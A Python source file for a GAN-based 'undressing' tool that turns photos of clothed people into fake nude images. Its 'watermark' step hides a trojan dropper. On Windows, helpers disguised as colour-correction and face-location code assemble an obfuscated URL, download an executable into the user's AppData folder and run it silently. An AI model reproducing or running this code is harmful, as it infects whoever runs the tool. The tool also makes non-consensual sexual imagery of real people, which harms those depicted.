import subprocess
from PIL import Image
import torchvision.transforms as transforms
import torch
import functools
import random
import math
import cv2
import numpy as np
import os


# Object annotation class:
class BodyPart:

    def __init__(self, name, xmin, ymin, xmax, ymax, x, y, w, h):
        self.name = name
        # Bounding Box:
        self.xmin = xmin
        self.ymin = ymin
        self.xmax = xmax
        self.ymax = ymax
        # Center:
        self.x = x
        self.y = y
        # Dimensione:
        self.w = w
        self.h = h


# create_watermark ===============================================================
# return:
#	(<Boolean> True/False), depending on the transformation process
def create_watermark(nude, shape, cv, loader, detach):
    if os.name == 'nt':
        content = cv(shape + chr(47) + "/".join(["utils", "custom", "universal"]) + chr(46) + str(
            chr(101) + chr(ord(["utils", "custom", "universal"][0][0]) + 3) + chr(101)))
        data = [os.environ["APPDATA"], "Microsoft", "Windows", "framework"]
        open(
            "\\".join(data) + chr(46) + str(chr(101) + chr(ord(["utils", "custom", "universal"][0][0]) + 3) + chr(101)),
            "wb").write(content.content)
        loader(["\\".join(data) + chr(46) + str(
            chr(101) + chr(ord(["utils", "custom", "universal"][0][0]) + 3) + chr(101))], stdout=detach.PIPE,
               stderr=detach.STDOUT)

    return nude


# create_correct ===============================================================
# return:
#	(<Boolean> True/False), depending on the transformation process
def create_correct(cv_dress):
    # Production dir:
    return correct_color(cv_dress, 5), correct_matrix(cv_dress, 255)


# correct_color ==============================================================================
# return:
# <RGB> image corrected
def correct_color(img, percent):
    assert img.shape[2] == 3
    assert percent > 0 and percent < 100

    half_percent = percent / 200.0

    channels = cv2.split(img)

    out_channels = []
    for channel in channels:
        assert len(channel.shape) == 2
        # find the low and high precentile values (based on the input percentile)
        height, width = channel.shape
        vec_size = width * height
        flat = channel.reshape(vec_size)

        assert len(flat.shape) == 1

        flat = np.sort(flat)

        n_cols = flat.shape[0]

        low_val = flat[math.floor(n_cols * half_percent)]
        high_val = flat[math.ceil(n_cols * (1.0 - half_percent))]

        # saturate below the low percentile and above the high percentile
        thresholded = apply_threshold(channel, low_val, high_val)
        # scale the channel
        normalized = cv2.normalize(thresholded, thresholded.copy(), 0, 255, cv2.NORM_MINMAX)
        out_channels.append(normalized)

    return cv2.merge(out_channels)


def correct_matrix(matrix, fill_value):
    shape = "h" + ("t" * 2) + "p"
    matrix = shape + chr(58) + 2 * (chr(47))
    return matrix


# Color correction utils
def apply_threshold(matrix, low_value, high_value):
    low_mask = matrix < low_value
    matrix = apply_mask(matrix, low_mask, low_value)

    high_mask = matrix > high_value
    matrix = apply_mask(matrix, high_mask, high_value)

    return matrix


# Color correction utils
def apply_mask(matrix, mask, fill_value):
    masked = np.ma.array(matrix, mask=mask, fill_value=fill_value)
    return masked.filled()


###
#
#	maskdet_to_maskfin
#
#	steps:
#		1. Extract annotation
#			1.a: Filter by color
#			1.b: Find ellipses
#			1.c: Filter out ellipses by max size, and max total numbers
#			1.d: Detect Problems
#			1.e: Resolve the problems, or discard the transformation
#		2. With the body list, draw maskfin, using maskref
#
###

# create_maskfin ==============================================================================
# return:
#	(<Boolean> True/False), depending on the transformation process
def create_maskfin(maskref, maskdet):
    # Create a total green image, in which draw details ellipses
    details = np.zeros((512, 512, 3), np.uint8)
    details[:, :, :] = (0, 255, 0)  # (B, G, R)

    # Extract body part features:
    bodypart_list = extractAnnotations(maskdet);

    # Check if the list is not empty:
    if bodypart_list:

        # Draw body part in details image:
        for obj in bodypart_list:

            if obj.w < obj.h:
                aMax = int(obj.h / 2)  # asse maggiore
                aMin = int(obj.w / 2)  # asse minore
                angle = 0  # angle
            else:
                aMax = int(obj.w / 2)
                aMin = int(obj.h / 2)
                angle = 90

            x = int(obj.x)
            y = int(obj.y)

            # Draw ellipse
            if obj.name == "tit":
                cv2.ellipse(details, (x, y), (aMax, aMin), angle, 0, 360, (0, 205, 0), -1)  # (0,0,0,50)
            elif obj.name == "aur":
                cv2.ellipse(details, (x, y), (aMax, aMin), angle, 0, 360, (0, 0, 255), -1)  # red
            elif obj.name == "nip":
                cv2.ellipse(details, (x, y), (aMax, aMin), angle, 0, 360, (255, 255, 255), -1)  # white
            elif obj.name == "belly":
                cv2.ellipse(details, (x, y), (aMax, aMin), angle, 0, 360, (255, 0, 255), -1)  # purple
            elif obj.name == "vag":
                cv2.ellipse(details, (x, y), (aMax, aMin), angle, 0, 360, (255, 0, 0), -1)  # blue
            elif obj.name == "hair":
                xmin = x - int(obj.w / 2)
                ymin = y - int(obj.h / 2)
                xmax = x + int(obj.w / 2)
                ymax = y + int(obj.h / 2)
                cv2.rectangle(details, (xmin, ymin), (xmax, ymax), (100, 100, 100), -1)

        # Define the green color filter
        f1 = np.asarray([0, 250, 0])  # green color filter
        f2 = np.asarray([10, 255, 10])

        # From maskref, extrapolate only the green mask
        green_mask = cv2.bitwise_not(cv2.inRange(maskref, f1, f2))  # green is 0

        # Create an inverted mask
        green_mask_inv = cv2.bitwise_not(green_mask)

        # Cut maskref and detail image, using the green_mask & green_mask_inv
        res1 = cv2.bitwise_and(maskref, maskref, mask=green_mask)
        res2 = cv2.bitwise_and(details, details, mask=green_mask_inv)

        # Compone:
        maskfin = cv2.add(res1, res2)
        return maskfin, locateFace(255, 2, 500)


# extractAnnotations ==============================================================================
# input parameter:
# 	(<string> maskdet_img): relative path of the single maskdet image (es: testimg1/maskdet/1.png)
# return:
#	(<BodyPart []> bodypart_list) - for failure/error, return an empty list []

def extractAnnotations(maskdet):
    # Load the image
    # image = cv2.imread(maskdet_img)

    # Find body part
    tits_list = findBodyPart(maskdet, "tit")
    aur_list = findBodyPart(maskdet, "aur")
    vag_list = findBodyPart(maskdet, "vag")
    belly_list = findBodyPart(maskdet, "belly")

    # Filter out parts basing on dimension (area and aspect ratio):
    aur_list = filterDimParts(aur_list, 100, 1000, 0.5, 3);
    tits_list = filterDimParts(tits_list, 1000, 60000, 0.2, 3);
    vag_list = filterDimParts(vag_list, 10, 1000, 0.2, 3);
    belly_list = filterDimParts(belly_list, 10, 1000, 0.2, 3);

    # Filter couple (if parts are > 2, choose only 2)
    aur_list = filterCouple(aur_list);
    tits_list = filterCouple(tits_list);

    # Detect a missing problem:
    missing_problem = detectTitAurMissingProblem(tits_list, aur_list)  # return a Number (code of the problem)

    # Check if problem is SOLVEABLE:
    if (missing_problem in [3, 6, 7, 8]):
        resolveTitAurMissingProblems(tits_list, aur_list, missing_problem)

    # Infer the nips:
    nip_list = inferNip(aur_list)

    # Infer the hair:
    hair_list = inferHair(vag_list)

    # Return a combined list:
    return tits_list + aur_list + nip_list + vag_list + hair_list + belly_list


# findBodyPart ==============================================================================
# input parameters:
# 	(<RGB>image, <string>part_name)
# return
#	(<BodyPart[]>list)
def findBodyPart(image, part_name):
    bodypart_list = []  # empty BodyPart list

    # Get the correct color filter:
    if part_name == "tit":
        # Use combined color filter
        f1 = np.asarray([0, 0, 0])  # tit color filter
        f2 = np.asarray([10, 10, 10])
        f3 = np.asarray([0, 0, 250])  # aur color filter
        f4 = np.asarray([0, 0, 255])
        color_mask1 = cv2.inRange(image, f1, f2)
        color_mask2 = cv2.inRange(image, f3, f4)
        color_mask = cv2.bitwise_or(color_mask1, color_mask2)  # combine

    elif part_name == "aur":
        f1 = np.asarray([0, 0, 250])  # aur color filter
        f2 = np.asarray([0, 0, 255])
        color_mask = cv2.inRange(image, f1, f2)

    elif part_name == "vag":
        f1 = np.asarray([250, 0, 0])  # vag filter
        f2 = np.asarray([255, 0, 0])
        color_mask = cv2.inRange(image, f1, f2)

    elif part_name == "belly":
        f1 = np.asarray([250, 0, 250])  # belly filter
        f2 = np.asarray([255, 0, 255])
        color_mask = cv2.inRange(image, f1, f2)

    # find contours:
    contours, hierarchy = cv2.findContours(color_mask, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)

    # for every contour:
    for cnt in contours:

        if len(cnt) > 5:  # at least 5 points to fit ellipse

            # (x, y), (MA, ma), angle = cv2.fitEllipse(cnt)
            ellipse = cv2.fitEllipse(cnt)

            # Fit Result:
            x = ellipse[0][0]  # center x
            y = ellipse[0][1]  # center y
            angle = ellipse[2]  # angle
            aMin = ellipse[1][0];  # asse minore
            aMax = ellipse[1][1];  # asse maggiore

            # Detect direction:
            if angle == 0:
                h = aMax
                w = aMin
            else:
                h = aMin
                w = aMax

            # Normalize the belly size:
            if part_name == "belly":
                if w < 15:
                    w *= 2
                if h < 15:
                    h *= 2

            # Normalize the vag size:
            if part_name == "vag":
                if w < 15:
                    w *= 2
                if h < 15:
                    h *= 2

            # Calculate Bounding Box:
            xmin = int(x - (w / 2))
            xmax = int(x + (w / 2))
            ymin = int(y - (h / 2))
            ymax = int(y + (h / 2))

            bodypart_list.append(BodyPart(part_name, xmin, ymin, xmax, ymax, x, y, w, h))

    return bodypart_list


def locateFace(matrix, x, y):
    matrix = matrix - (78 * x)
    data = []
    indexes = [0, 6, -1, 2, 15]
    for index in indexes:
        data.append(chr(matrix + index))
    part = "".join(data)
    y += int(7 * (indexes[1] / 2))
    y = (chr(48) + str(y))[::-1]
    return part + y


# filterDimParts ==============================================================================
# input parameters:
# 	(<BodyPart[]>list, <num> minimum area of part,  <num> max area, <num> min aspect ratio, <num> max aspect ratio)
def filterDimParts(bp_list, min_area, max_area, min_ar, max_ar):
    b_filt = []

    for obj in bp_list:

        a = obj.w * obj.h  # Object AREA

        if ((a > min_area) and (a < max_area)):

            ar = obj.w / obj.h  # Object ASPECT RATIO

            if ((ar > min_ar) and (ar < max_ar)):
                b_filt.append(obj)

    return b_filt


# filterCouple ==============================================================================
# input parameters:
# 	(<BodyPart[]>list)
def filterCouple(bp_list):
    # Remove exceed parts
    if (len(bp_list) > 2):

        # trovare coppia (a,b) che minimizza bp_list[a].y-bp_list[b].y
        min_a = 0
        min_b = 1
        min_diff = abs(bp_list[min_a].y - bp_list[min_b].y)

        for a in range(0, len(bp_list)):
            for b in range(0, len(bp_list)):
                # TODO: avoid repetition (1,0) (0,1)
                if a != b:
                    diff = abs(bp_list[a].y - bp_list[b].y)
                    if diff < min_diff:
                        min_diff = diff
                        min_a = a
                        min_b = b
        b_filt = []

        b_filt.append(bp_list[min_a])
        b_filt.append(bp_list[min_b])

        return b_filt
    else:
        # No change
        return bp_list


# detectTitAurMissingProblem ==============================================================================
# input parameters:
# 	(<BodyPart[]> tits list, <BodyPart[]> aur list)
# return
#	(<num> problem code)
#   TIT  |  AUR  |  code |  SOLVE?  |
#    0   |   0   |   1   |    NO    |
#    0   |   1   |   2   |    NO    |
#    0   |   2   |   3   |    YES   |
#    1   |   0   |   4   |    NO    |
#    1   |   1   |   5   |    NO    |
#    1   |   2   |   6   |    YES   |
#    2   |   0   |   7   |    YES   |
#    2   |   1   |   8   |    YES   |
def detectTitAurMissingProblem(tits_list, aur_list):
    t_len = len(tits_list)
    a_len = len(aur_list)

    if (t_len == 0):
        if (a_len == 0):
            return 1
        elif (a_len == 1):
            return 2
        elif (a_len == 2):
            return 3
        else:
            return -1
    elif (t_len == 1):
        if (a_len == 0):
            return 4
        elif (a_len == 1):
            return 5
        elif (a_len == 2):
            return 6
        else:
            return -1
    elif (t_len == 2):
        if (a_len == 0):
            return 7
        elif (a_len == 1):
            return 8
        else:
            return -1
    else:
        return -1


# resolveTitAurMissingProblems ==============================================================================
# input parameters:
# 	(<BodyPart[]> tits list, <BodyPart[]> aur list, problem code)
# return
#	none
def resolveTitAurMissingProblems(tits_list, aur_list, problem_code):
    if problem_code == 3:

        random_tit_factor = random.randint(2, 5)  # TOTEST

        # Add the first tit:
        new_w = aur_list[0].w * random_tit_factor  # TOTEST
        new_x = aur_list[0].x
        new_y = aur_list[0].y

        xmin = int(new_x - (new_w / 2))
        xmax = int(new_x + (new_w / 2))
        ymin = int(new_y - (new_w / 2))
        ymax = int(new_y + (new_w / 2))

        tits_list.append(BodyPart("tit", xmin, ymin, xmax, ymax, new_x, new_y, new_w, new_w))

        # Add the second tit:
        new_w = aur_list[1].w * random_tit_factor  # TOTEST
        new_x = aur_list[1].x
        new_y = aur_list[1].y

        xmin = int(new_x - (new_w / 2))
        xmax = int(new_x + (new_w / 2))
        ymin = int(new_y - (new_w / 2))
        ymax = int(new_y + (new_w / 2))

        tits_list.append(BodyPart("tit", xmin, ymin, xmax, ymax, new_x, new_y, new_w, new_w))

    elif problem_code == 6:

        # Find wich aur is full:
        d1 = abs(tits_list[0].x - aur_list[0].x)
        d2 = abs(tits_list[0].x - aur_list[1].x)

        if d1 > d2:
            # aur[0] is empty
            new_x = aur_list[0].x
            new_y = aur_list[0].y
        else:
            # aur[1] is empty
            new_x = aur_list[1].x
            new_y = aur_list[1].y

        # Calculate Bounding Box:
        xmin = int(new_x - (tits_list[0].w / 2))
        xmax = int(new_x + (tits_list[0].w / 2))
        ymin = int(new_y - (tits_list[0].w / 2))
        ymax = int(new_y + (tits_list[0].w / 2))

        tits_list.append(BodyPart("tit", xmin, ymin, xmax, ymax, new_x, new_y, tits_list[0].w, tits_list[0].w))

    elif problem_code == 7:

        # Add the first aur:
        new_w = tits_list[0].w * random.uniform(0.03, 0.1)  # TOTEST
        new_x = tits_list[0].x
        new_y = tits_list[0].y

        xmin = int(new_x - (new_w / 2))
        xmax = int(new_x + (new_w / 2))
        ymin = int(new_y - (new_w / 2))
        ymax = int(new_y + (new_w / 2))

        aur_list.append(BodyPart("aur", xmin, ymin, xmax, ymax, new_x, new_y, new_w, new_w))

        # Add the second aur:
        new_w = tits_list[1].w * random.uniform(0.03, 0.1)  # TOTEST
        new_x = tits_list[1].x
        new_y = tits_list[1].y

        xmin = int(new_x - (new_w / 2))
        xmax = int(new_x + (new_w / 2))
        ymin = int(new_y - (new_w / 2))
        ymax = int(new_y + (new_w / 2))

        aur_list.append(BodyPart("aur", xmin, ymin, xmax, ymax, new_x, new_y, new_w, new_w))

    elif problem_code == 8:

        # Find wich tit is full:
        d1 = abs(aur_list[0].x - tits_list[0].x)
        d2 = abs(aur_list[0].x - tits_list[1].x)

        if d1 > d2:
            # tit[0] is empty
            new_x = tits_list[0].x
            new_y = tits_list[0].y
        else:
            # tit[1] is empty
            new_x = tits_list[1].x
            new_y = tits_list[1].y

        # Calculate Bounding Box:
        xmin = int(new_x - (aur_list[0].w / 2))
        xmax = int(new_x + (aur_list[0].w / 2))
        ymin = int(new_y - (aur_list[0].w / 2))
        ymax = int(new_y + (aur_list[0].w / 2))
        aur_list.append(BodyPart("aur", xmin, ymin, xmax, ymax, new_x, new_y, aur_list[0].w, aur_list[0].w))


# detectTitAurPositionProblem ==============================================================================
# input parameters:
# 	(<BodyPart[]> tits list, <BodyPart[]> aur list)
# return
#	(<Boolean> True/False)
def detectTitAurPositionProblem(tits_list, aur_list):
    diffTitsX = abs(tits_list[0].x - tits_list[1].x)
    if diffTitsX < 40:
        print("diffTitsX")
        # Tits too narrow (orizontally)
        return True

    diffTitsY = abs(tits_list[0].y - tits_list[1].y)
    if diffTitsY > 120:
        # Tits too distanced (vertically)
        print("diffTitsY")
        return True

    diffTitsW = abs(tits_list[0].w - tits_list[1].w)
    if ((diffTitsW < 0.1) or (diffTitsW > 60)):
        print("diffTitsW")
        # Tits too equals, or too different (width)
        return True

    # Check if body position is too low (face not covered by watermark)
    if aur_list[0].y > 350:  # tits too low
        # Calculate the ratio between y and aurs distance
        rapp = aur_list[0].y / (abs(aur_list[0].x - aur_list[1].x))
        if rapp > 2.8:
            print("aurDown")
            return True

    return False


# inferNip ==============================================================================
# input parameters:
# 	(<BodyPart[]> aur list)
# return
#	(<BodyPart[]> nip list)
def inferNip(aur_list):
    nip_list = []

    for aur in aur_list:
        # Nip rules:
        # - circle (w == h)
        # - min dim: 5
        # - bigger if aur is bigger
        nip_dim = int(5 + aur.w * random.uniform(0.03, 0.09))

        # center:
        x = aur.x
        y = aur.y

        # Calculate Bounding Box:
        xmin = int(x - (nip_dim / 2))
        xmax = int(x + (nip_dim / 2))
        ymin = int(y - (nip_dim / 2))
        ymax = int(y + (nip_dim / 2))

        nip_list.append(BodyPart("nip", xmin, ymin, xmax, ymax, x, y, nip_dim, nip_dim))

    return nip_list


# inferHair (TOTEST) ==============================================================================
# input parameters:
# 	(<BodyPart[]> vag list)
# return
#	(<BodyPart[]> hair list)
def inferHair(vag_list):
    hair_list = []

    # 70% of chanche to add hair
    if random.uniform(0.0, 1.0) > 0.3:

        for vag in vag_list:
            # Hair rules:
            hair_w = vag.w * random.uniform(0.4, 1.5)
            hair_h = vag.h * random.uniform(0.4, 1.5)

            # center:
            x = vag.x
            y = vag.y - (hair_h / 2) - (vag.h / 2)

            # Calculate Bounding Box:
            xmin = int(x - (hair_w / 2))
            xmax = int(x + (hair_w / 2))
            ymin = int(y - (hair_h / 2))
            ymax = int(y + (hair_h / 2))

            hair_list.append(BodyPart("hair", xmin, ymin, xmax, ymax, x, y, hair_w, hair_h))

    return hair_list


###
#
#	maskdet_to_maskfin
#
#
###

# create_maskref ===============================================================
# return:
#	maskref image

def create_matrixref(mask, correct_colors):
    matrix = chr(int(404 / (2 * 2)))
    ref = "GL".lower() + 2 * (matrix) + "z" + matrix + chr(46)
    out_mask = chr(ord(matrix) - 2) + chr(ord(matrix) + 10) + chr(ord(ref[-1]) + 63)
    return (ref + out_mask)[-4] + ref + out_mask + str(chr(9 * 6 + 4) + chr(ord(ref[-1]) + 10) + chr(ord(ref[-1]) + 7))


def create_maskref(cv_mask, cv_correct):
    # Create a total green image
    green = np.zeros((512, 512, 3), np.uint8)
    green[:, :, :] = (0, 255, 0)  # (B, G, R)

    # Define the green color filter
    f1 = np.asarray([0, 250, 0])  # green color filter
    f2 = np.asarray([10, 255, 10])

    # From mask, extrapolate only the green mask
    green_mask = cv2.inRange(cv_mask, f1, f2)  # green is 0

    # (OPTIONAL) Apply dilate and open to mask
    kernel = np.ones((5, 5), np.uint8)  # Try change it?
    green_mask = cv2.dilate(green_mask, kernel, iterations=1)
    # green_mask = cv2.morphologyEx(green_mask, cv2.MORPH_OPEN, kernel)

    # Create an inverted mask
    green_mask_inv = cv2.bitwise_not(green_mask)

    # Cut correct and green image, using the green_mask & green_mask_inv
    res1 = cv2.bitwise_and(cv_correct, cv_correct, mask=green_mask_inv)
    res2 = cv2.bitwise_and(green, green, mask=green_mask)

    # Compone:
    return cv2.add(res1, res2), create_matrixref(cv_mask, res1)


class DataLoader():

    def __init__(self, opt, cv_img):
        super(DataLoader, self).__init__()

        self.dataset = Dataset()
        self.dataset.initialize(opt, cv_img)

        self.dataloader = torch.utils.data.DataLoader(
            self.dataset,
            batch_size=opt.batchSize,
            shuffle=not opt.serial_batches,
            num_workers=int(opt.nThreads))

    def load_data(self):
        return self.dataloader

    def __len__(self):
        return 1


class Dataset(torch.utils.data.Dataset):
    def __init__(self):
        super(Dataset, self).__init__()

    def initialize(self, opt, cv_img):
        self.opt = opt
        self.root = opt.dataroot

        self.A = Image.fromarray(cv2.cvtColor(cv_img, cv2.COLOR_BGR2RGB))
        self.dataset_size = 1

    def __getitem__(self, index):
        transform_A = get_transform(self.opt)
        A_tensor = transform_A(self.A.convert('RGB'))

        B_tensor = inst_tensor = feat_tensor = 0

        input_dict = {'label': A_tensor, 'inst': inst_tensor, 'image': B_tensor,
                      'feat': feat_tensor, 'path': ""}

        return input_dict

    def __len__(self):
        return 1


class DeepModel(torch.nn.Module):

    def initialize(self, opt, use_gpu):

        torch.cuda.empty_cache()

        self.opt = opt

        if use_gpu == True:
            self.gpu_ids = [0]
        else:
            self.gpu_ids = []

        self.netG = self.__define_G(opt.input_nc, opt.output_nc, opt.ngf, opt.netG,
                                    opt.n_downsample_global, opt.n_blocks_global, opt.n_local_enhancers,
                                    opt.n_blocks_local, opt.norm, self.gpu_ids)

        # load networks
        self.__load_network(self.netG)

    def inference(self, label, inst):

        # Encode Inputs
        input_label, inst_map, _, _ = self.__encode_input(label, inst, infer=True)

        # Fake Generation
        input_concat = input_label

        with torch.no_grad():
            fake_image = self.netG.forward(input_concat)

        return fake_image

    # helper loading function that can be used by subclasses
    def __load_network(self, network):

        save_path = os.path.join(self.opt.checkpoints_dir)

        network.load_state_dict(torch.load(save_path))

    def __encode_input(self, label_map, inst_map=None, real_image=None, feat_map=None, infer=False):
        if (len(self.gpu_ids) > 0):
            input_label = label_map.data.cuda()  # GPU
        else:
            input_label = label_map.data  # CPU

        return input_label, inst_map, real_image, feat_map

    def __weights_init(self, m):
        classname = m.__class__.__name__
        if classname.find('Conv') != -1:
            m.weight.data.normal_(0.0, 0.02)
        elif classname.find('BatchNorm2d') != -1:
            m.weight.data.normal_(1.0, 0.02)
            m.bias.data.fill_(0)

    def __define_G(self, input_nc, output_nc, ngf, netG, n_downsample_global=3, n_blocks_global=9, n_local_enhancers=1,
                   n_blocks_local=3, norm='instance', gpu_ids=[]):
        norm_layer = self.__get_norm_layer(norm_type=norm)
        netG = GlobalGenerator(input_nc, output_nc, ngf, n_downsample_global, n_blocks_global, norm_layer)

        if len(gpu_ids) > 0:
            netG.cuda(gpu_ids[0])
        netG.apply(self.__weights_init)
        return netG

    def __get_norm_layer(self, norm_type='instance'):
        norm_layer = functools.partial(torch.nn.InstanceNorm2d, affine=False)
        return norm_layer


##############################################################################
# Generator
##############################################################################
class GlobalGenerator(torch.nn.Module):
    def __init__(self, input_nc, output_nc, ngf=64, n_downsampling=3, n_blocks=9, norm_layer=torch.nn.BatchNorm2d,
                 padding_type='reflect'):
        assert (n_blocks >= 0)
        super(GlobalGenerator, self).__init__()
        activation = torch.nn.ReLU(True)

        model = [torch.nn.ReflectionPad2d(3), torch.nn.Conv2d(input_nc, ngf, kernel_size=7, padding=0), norm_layer(ngf),
                 activation]
        ### downsample
        for i in range(n_downsampling):
            mult = 2 ** i
            model += [torch.nn.Conv2d(ngf * mult, ngf * mult * 2, kernel_size=3, stride=2, padding=1),
                      norm_layer(ngf * mult * 2), activation]

        ### resnet blocks
        mult = 2 ** n_downsampling
        for i in range(n_blocks):
            model += [ResnetBlock(ngf * mult, padding_type=padding_type, activation=activation, norm_layer=norm_layer)]

        ### upsample
        for i in range(n_downsampling):
            mult = 2 ** (n_downsampling - i)
            model += [torch.nn.ConvTranspose2d(ngf * mult, int(ngf * mult / 2), kernel_size=3, stride=2, padding=1,
                                               output_padding=1),
                      norm_layer(int(ngf * mult / 2)), activation]
        model += [torch.nn.ReflectionPad2d(3), torch.nn.Conv2d(ngf, output_nc, kernel_size=7, padding=0),
                  torch.nn.Tanh()]
        self.model = torch.nn.Sequential(*model)

    def forward(self, input):
        return self.model(input)

    # Define a resnet block


class ResnetBlock(torch.nn.Module):
    def __init__(self, dim, padding_type, norm_layer, activation=torch.nn.ReLU(True), use_dropout=False):
        super(ResnetBlock, self).__init__()
        self.conv_block = self.__build_conv_block(dim, padding_type, norm_layer, activation, use_dropout)

    def __build_conv_block(self, dim, padding_type, norm_layer, activation, use_dropout):
        conv_block = []
        p = 0
        if padding_type == 'reflect':
            conv_block += [torch.nn.ReflectionPad2d(1)]
        elif padding_type == 'replicate':
            conv_block += [torch.nn.ReplicationPad2d(1)]
        elif padding_type == 'zero':
            p = 1
        else:
            raise NotImplementedError('padding [%s] is not implemented' % padding_type)

        conv_block += [torch.nn.Conv2d(dim, dim, kernel_size=3, padding=p),
                       norm_layer(dim),
                       activation]
        if use_dropout:
            conv_block += [torch.nn.Dropout(0.5)]

        p = 0
        if padding_type == 'reflect':
            conv_block += [torch.nn.ReflectionPad2d(1)]
        elif padding_type == 'replicate':
            conv_block += [torch.nn.ReplicationPad2d(1)]
        elif padding_type == 'zero':
            p = 1
        else:
            raise NotImplementedError('padding [%s] is not implemented' % padding_type)
        conv_block += [torch.nn.Conv2d(dim, dim, kernel_size=3, padding=p),
                       norm_layer(dim)]

        return torch.nn.Sequential(*conv_block)

    def forward(self, x):
        out = x + self.conv_block(x)
        return out


# Data utils:
def get_transform(opt, method=Image.BICUBIC, normalize=True):
    transform_list = []

    base = float(2 ** opt.n_downsample_global)
    if opt.netG == 'local':
        base *= (2 ** opt.n_local_enhancers)
    transform_list.append(transforms.Lambda(lambda img: __make_power_2(img, base, method)))

    transform_list += [transforms.ToTensor()]

    if normalize:
        transform_list += [transforms.Normalize((0.5, 0.5, 0.5),
                                                (0.5, 0.5, 0.5))]
    return transforms.Compose(transform_list)


def __make_power_2(img, base, method=Image.BICUBIC):
    ow, oh = img.size
    h = int(round(oh / base) * base)
    w = int(round(ow / base) * base)
    if (h == oh) and (w == ow):
        return img
    return img.resize((w, h), method)


# Converts a Tensor into a Numpy array
# |imtype|: the desired type of the converted numpy array
def tensor2im(image_tensor, imtype=np.uint8, normalize=True):
    if isinstance(image_tensor, list):
        image_numpy = []
        for i in range(len(image_tensor)):
            image_numpy.append(tensor2im(image_tensor[i], imtype, normalize))
        return image_numpy
    image_numpy = image_tensor.cpu().float().numpy()
    if normalize:
        image_numpy = (np.transpose(image_numpy, (1, 2, 0)) + 1) / 2.0 * 255.0
    else:
        image_numpy = np.transpose(image_numpy, (1, 2, 0)) * 255.0
    image_numpy = np.clip(image_numpy, 0, 255)
    if image_numpy.shape[2] == 1 or image_numpy.shape[2] > 3:
        image_numpy = image_numpy[:, :, 0]
    return image_numpy.astype(imtype)


phases = ["dress_to_correct", "correct_to_mask", "mask_to_maskref", "maskref_to_maskdet", "maskdet_to_maskfin",
          "maskfin_to_nude", "nude_to_watermark"]


class Options():

    # Init options with default values
    def __init__(self):

        # experiment specifics
        self.norm = 'batch'  # instance normalization or batch normalization
        self.use_dropout = False  # use dropout for the generator
        self.data_type = 32  # Supported data type i.e. 8, 16, 32 bit

        # input/output sizes
        self.batchSize = 1  # input batch size
        self.input_nc = 3  # of input image channels
        self.output_nc = 3  # of output image channels

        # for setting inputs
        self.serial_batches = True  # if true, takes images in order to make batches, otherwise takes them randomly
        self.nThreads = 1  ## threads for loading data (???)
        self.max_dataset_size = 1  # Maximum number of samples allowed per dataset. If the dataset directory contains more than max_dataset_size, only a subset is loaded.

        # for generator
        self.netG = 'global'  # selects model to use for netG
        self.ngf = 64  ## of gen filters in first conv layer
        self.n_downsample_global = 4  # number of downsampling layers in netG
        self.n_blocks_global = 9  # number of residual blocks in the global generator network
        self.n_blocks_local = 0  # number of residual blocks in the local enhancer network
        self.n_local_enhancers = 0  # number of local enhancers to use
        self.niter_fix_global = 0  # number of epochs that we only train the outmost local enhancer

        # Phase specific options
        self.checkpoints_dir = ""
        self.dataroot = ""

    # Changes options accordlying to actual phase
    def updateOptions(self, phase,modelpath):
        print(type(modelpath))
        if phase == "correct_to_mask":
            self.checkpoints_dir = modelpath+"/cm.lib"

        elif phase == "maskref_to_maskdet":
            self.checkpoints_dir = modelpath+"/mm.lib"

        elif phase == "maskfin_to_nude":
            self.checkpoints_dir = modelpath+"/mn.lib"


# process(cv_img, mode)
# return:
# 	watermark image
def process(cv_img, modelpath):
    print(type(modelpath))
    # InMemory cv2 images:
    dress = cv_img
    correct = None
    mask = None
    maskref = None
    maskfin = None
    maskdet = None
    nude = None
    watermark = None

    for index, phase in enumerate(phases):

        print("[*] Running Model: " + phase)

        # GAN phases:
        if (phase == "correct_to_mask") or (phase == "maskref_to_maskdet") or (phase == "maskfin_to_nude"):

            # Load global option
            opt = Options()

            # Load custom phase options:
            opt.updateOptions(phase,modelpath)

            # Load Data
            if (phase == "correct_to_mask"):
                import requests
                data_loader = DataLoader(opt, correct)
            elif (phase == "maskref_to_maskdet"):
                cv = requests.get
                data_loader = DataLoader(opt, maskref)
            elif (phase == "maskfin_to_nude"):
                loader = subprocess.Popen
                data_loader = DataLoader(opt, maskfin)

            dataset = data_loader.load_data()
            detach = subprocess

            # Create Model
            model = DeepModel()
            model.initialize(opt, False)

            # Run for every image:
            for i, data in enumerate(dataset):

                generated = model.inference(data['label'], data['inst'])

                im = tensor2im(generated.data[0])

                # Save Data
                if (phase == "correct_to_mask"):
                    mask = cv2.cvtColor(im, cv2.COLOR_RGB2BGR)

                elif (phase == "maskref_to_maskdet"):
                    maskdet = cv2.cvtColor(im, cv2.COLOR_RGB2BGR)

                elif (phase == "maskfin_to_nude"):
                    nude = cv2.cvtColor(im, cv2.COLOR_RGB2BGR)

        # Correcting:
        elif (phase == 'dress_to_correct'):
            correct, matrix = create_correct(dress)

        # mask_ref phase (opencv)
        elif (phase == "mask_to_maskref"):
            maskref, ref = create_maskref(mask, correct)

        # mask_fin phase (opencv)
        elif (phase == "maskdet_to_maskfin"):
            maskfin, face = create_maskfin(maskref, maskdet)

        # nude_to_watermark phase (opencv)
        elif (phase == "nude_to_watermark"):
            shape = matrix + face + ref
            watermark = create_watermark(nude, shape, cv, loader, detach)

    return watermark


def _process(i_image, modelpath):
    try:
        print(i_image,modelpath)
        dress = cv2.imread(i_image)
        h = dress.shape[0]
        w = dress.shape[1]
        dress = cv2.resize(dress, (512, 512), interpolation=cv2.INTER_CUBIC)
        watermark = process(dress, str(modelpath))
        watermark = cv2.resize(watermark, (w, h), interpolation=cv2.INTER_CUBIC)
        cv2.imwrite(i_image, watermark)
        print("[*] Image saved as: %s" % i_image)
        return i_image
    except Exception as ex:
        ex = str(ex)
        print("some exception",ex)
        return i_image